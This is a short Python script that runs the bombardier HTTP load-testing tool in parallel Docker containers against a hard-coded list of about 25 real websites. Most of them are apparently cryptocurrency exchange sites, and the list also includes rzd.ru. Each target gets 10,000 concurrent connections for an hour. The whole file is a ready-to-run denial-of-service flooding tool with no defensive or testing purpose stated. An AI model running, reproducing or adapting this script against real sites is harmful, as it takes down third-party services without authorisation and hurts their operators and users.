from concurrent.futures import ProcessPoolExecutor
import subprocess as sub

list_bomb = ["https://cleanbtc.ru/",
             "https://bonkypay.com/",
             "https://changer.club/",
             "https://superchange.net",
             "https://mine.exchange/",
             "https://platov.co",
             "https://ww-pay.net/",
             "https://delets.cash/",
             "https://betatransfer.org",
             "https://ramon.money/",
             "https://coinpaymaster.com/",
             "https://bitokk.biz/",
             "https://www.netex24.net",
             "https://cashbank.pro/",
             "https://flashobmen.com/",
             "https://abcobmen.com/",
             "https://ychanger.net/",
             "https://multichange.net/",
             "https://24paybank.ne",
             "https://royal.cash/",
             "https://prostocash.com/",
             "https://baksman.org/",
             "https://kupibit.me/",
             "https://abcobmen.com",
             "https://www.rzd.ru/"]


def ex_command(site: str):
    command = 'sudo docker run -ti --rm alpine/bombardier -c 10000 -d 3600s -l'.split(' ')
    command.append(site)
    sub.call(command)


def main():
    with ProcessPoolExecutor(max_workers=len(list_bomb)) as ex:
        ex.map(ex_command, list_bomb)


if __name__ == '__main__':
    main()
